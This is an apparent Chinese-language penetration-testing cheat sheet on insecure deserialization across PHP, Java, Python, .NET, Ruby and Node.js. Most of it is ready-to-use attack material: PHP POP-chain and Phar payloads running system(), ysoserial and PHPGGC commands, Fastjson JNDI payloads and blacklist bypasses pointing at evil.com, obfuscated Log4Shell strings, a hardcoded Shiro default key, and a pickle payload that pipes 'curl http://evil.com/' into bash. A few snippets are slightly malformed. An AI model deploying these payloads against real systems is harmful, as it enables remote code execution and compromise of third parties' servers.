# 反序列化漏洞

## 原理

应用程序将用户可控的数据反序列化为对象时，触发了类中的魔术方法（如 `__wakeup`、`__destruct`、`readObject`），攻击者构造恶意对象链（POP chain / gadget chain）实现任意代码执行。

## 各语言反序列化

### PHP 反序列化

#### 魔术方法

```php
__construct()   // 对象创建时
__destruct()    // 对象销毁时
__wakeup()      // unserialize 时
__sleep()       // serialize 时
__toString()    // 对象转字符串时
__call()        // 调用不存在的方法时
__callStatic()  // 静态调用不存在的方法时
__get()         // 访问不存在的属性时
__set()         // 设置不存在的属性时
__isset()      // isset 不存在的属性时
__unset()       // unset 不存在的属性时
__invoke()      // 对象作为函数调用时
```

#### 基础利用

```php
<?php
class FileList {
    public $filename;
    function __destruct() {
        readfile($this->filename);
    }
}

// 构造 payload
$payload = new FileList();
$payload->filename = '/etc/passwd';
echo serialize($payload);
// O:8:"FileList":1:{s:8:"filename";s:11:"/etc/passwd";}
```

#### POP 链构造

```php
// 经典 __wakeup 绕过（PHP < 5.6.25, 7.0.10）
// 属性个数大于实际属性个数时跳过 __wakeup
O:8:"FileList":2:{s:8:"filename";s:11:"/etc/passwd";}
//                  ^ 改为 2，实际只有 1 个属性

// __toString 触发
class A {
    function __toString() {
        system($this->cmd);
        return '';
    }
}
class B {
    function __destruct() {
        echo $this->obj;
    }
}

$payload = new B();
$payload->obj = new A();
$payload->obj->cmd = 'id';
echo serialize($payload);
```

#### Phar 反序列化

```php
// Phar 文件元数据会被反序列化
// 触发点：file_exists(), is_dir(), filesize(), file_get_contents() 等

// 生成 phar
<?php
class Evil {
    public $cmd = 'id';
    function __destruct() {
        system($this->cmd);
    }
}
$phar = new Phar('evil.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata(new Evil());
$phar->addFromString('test.txt', 'test');
$phar->stopBuffering();

// 触发
file_exists('phar://evil.phar')
file_exists('phar://evil.phar/test.txt')
```

#### 常见 gadget

```php
// __destruct + __toString
// __wakeup + __destruct
// __call + __invoke

// PHPGGC 工具
phpggc Laravel/RCE1 system id
phpggc Symfony/RCE4 system id
phpggc Monolog/RCE1 system id
phpggc WordPress/RCE1 system id
phpggc Drupal/RCE1 system id
```

### Java 反序列化

#### 基础

```java
// ObjectInputStream.readObject()
// 触发 readObject, readResolve 方法

// 常见 gadget
// CommonsCollections 1-7
// CommonsBeanutils
// Spring
// Fastjson
// Jackson
// Shiro
// Log4j
```

#### ysoserial gadget

```bash
# CommonsCollections1
java -jar ysoserial.jar CommonsCollections1 'cmd' > payload.bin

# CommonsCollections6 (最常用)
java -jar ysoserial.jar CommonsCollections6 'bash -c {echo,id}|{base64,-d}|bash' > payload.bin

# CommonsBeanutils1
java -jar ysoserial.jar CommonsBeanutils1 'cmd' > payload.bin

# URLDNS (探测)
java -jar ysoserial.jar URLDNS 'http://evil.com/' > payload.bin
```

#### Fastjson 反序列化

```json
// 1.2.24 之前
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil.com/Exploit","autoCommit":true}

// 1.2.47 绕过
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil.com/Exploit","autoCommit":true}}

// 1.2.68 safemode 绕过
{"@type":"java.lang.AutoCloseable","@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",...}
```

#### Shiro 反序列化

```bash
# Shiro 1.2.4 默认密钥
# Cookie: rememberMe=<payload>
# 默认 key: kPH+bIxk5D2deZiIxcaaaA==

# 工具：ShiroExploit
# 生成 payload
java -jar shiroexploit.jar
```

#### Log4j (Log4Shell)

```bash
# CVE-2021-44228
${jndi:ldap://evil.com/Exploit}
${jndi:rmi://evil.com/Exploit}

# 绕过
${jndi:${lower:l}${lower:d}ap://evil.com/Exploit}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-a}${::-p}://evil.com/Exploit}
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//evil.com/Exploit}
```

### Python 反序列化

#### pickle

```python
import pickle
import os

class Evil(object):
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Evil())
# pickle.loads(payload) 触发

# 命令执行
import pickle
import os

class Evil:
    def __reduce__(self):
        return (os.system, ('curl http://evil.com/|bash',))

print(pickle.dumps(Evil()))

# 复杂命令
class Evil:
    def __reduce__(self):
        return (exec, ("import os;os.system('id')",))
```

#### 其他 Python 反序列化

```python
# yaml.load (不安全)
import yaml
yaml.load(payload, Loader=yaml.Loader)  # 不安全
yaml.safe_load(payload)  # 安全

# jsonpickle
jsonpickle.decode(payload)

# shelve
import shelve
db = shelve.open('test')
# db['key'] = pickle 数据

# torch.load (PyTorch)
torch.load('model.pt')  # 不安全
torch.load('model.pt', weights_only=True)  # 安全
```

### .NET 反序列化

```csharp
// BinaryFormatter
BinaryFormatter formatter = new BinaryFormatter();
formatter.Deserialize(stream);

// LosFormatter
LosFormatter formatter = new LosFormatter();
formatter.Deserialize(input);

// ViewState
// 工具：ysoserial.net
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "cmd" -o base64
```

### Ruby 反序列化

```ruby
# Ruby Marshal
Marshal.load(payload)  # 不安全

# gadget
class Evil
  def marshal_dump
    # ...
  end
end
```

### Node.js 反序列化

```javascript
// node-serialize
var serialize = require('node-serialize');
serialize.unserialize(payload);  # 不安全

// payload
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id', function(error, stdout, stderr){console.log(stdout)});}"}
```

## 绕过技巧

### 1. PHP __wakeup 绕过

```php
// PHP < 5.6.25, 7.0.10
// 属性个数大于实际个数时跳过 __wakeup
O:4:"User":2:{s:3:"cmd";s:2:"id";}  // 实际 1 个属性，写 2
```

### 2. PHP 字符串逃逸

```php
// 当序列化字符串被过滤替换
// 替换后变长：可注入额外属性
// 替换后变短：可逃逸字符串

// 例：过滤 "flag" 为 "flagflag"
// 原始：s:4:"flag"
// 替换后：s:4:"flagflag" → 解析错误
// 构造：s:4:"flagflag";s:4:"test";} → 逃逸
```

### 3. Java 反序列化绕过

```bash
# CommonsCollections3.1 被黑名单
# 使用 CommonsCollections6, 7
# 使用 CommonsBeanutils
# 使用 JDK7u21
# 使用 JRMPClient
```

### 4. Fastjson 绕过

```json
// 1.2.25 引入 AutoType 黑名单
// 1.2.41: L 前缀绕过
{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://evil.com/Exploit","autoCommit":true}

// 1.2.42: 双 L 绕过
{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://evil.com/Exploit","autoCommit":true}

// 1.2.43: [ 绕过
{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{,"dataSourceName":"ldap://evil.com/Exploit","autoCommit":true}

// 1.2.47: Class 缓存绕过（最经典）
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil.com/Exploit","autoCommit":true}}
```

### 5. Shiro 绕过

```bash
# 默认 key 被改
# 爆破 key
# 工具：ShiroExploit, shiro-key

# rememberMe 长度限制
# 使用更短的 gadget
# 使用 JRMP 协议
```

## 2024-2026 新技术点

### 1. Java 新 gadget

```bash
# Spring4Shell (CVE-2022-22965)
# Spring Framework RCE
# 通过 ClassLoader 操纵

# Spring Cloud Function SpEL
# CVE-2022-22963

# Apache Struts 2 新漏洞
# CVE-2023-50164 (文件上传导致 OGNL)
# CVE-2024-53677 (Struts2 文件上传)
```

### 2. Fastjson 2.x

```json
// Fastjson 2 新特性
// 仍存在反序列化风险
// 新的 gadget 链
```

### 3. Python pickle 新 gadget

```python
# Python 3.11+ 新特性
# __reduce__ 之外的触发点
# 通过 __setstate__, __getstate__
```

### 4. .NET ViewState 新攻击

```csharp
# .NET 8 新特性
# ViewState MAC 绕过
# 工具：viewgen
```

### 5. AI 模型反序列化

```python
# PyTorch 模型加载
torch.load('model.pt')  # 不安全

# TensorFlow
tf.saved_model.load('model')

# Hugging Face
# pickle 反序列化攻击
```

### 6. K8s API 反序列化

```yaml
# Kubernetes API 对象反序列化
# 通过精心构造的 YAML 触发
```

### 7. Protobuf 反序列化

```protobuf
# gRPC 服务反序列化
# 通过 protobuf 触发 Java 反序列化
```

### 8. 现代框架反序列化

```python
# Django session
# Django Q cluster
# Celery task
# Redis pickle
```

## 工具推荐

- **PHPGGC** — PHP 反序列化 gadget 生成
- **ysoserial** — Java 反序列化 gadget
- **ysoserial.net** — .NET 反序列化 gadget
- **marshalsec** — Java 反序列化
- **ShiroExploit** — Shiro 反序列化利用
- **FastjsonExploit** — Fastjson 反序列化利用
- **JDGUI** — Java 反编译
- **gadgetinspector** — Java gadget 自动发现
- **GadgetProbe** — Java class 探测

## 参考链接

- [PayloadsAllTheThings - Deserialization](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization)
- [Java Deserialization Cheat Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet)
- [PHP Unserialize](https://www.php.net/manual/en/function.unserialize.php)
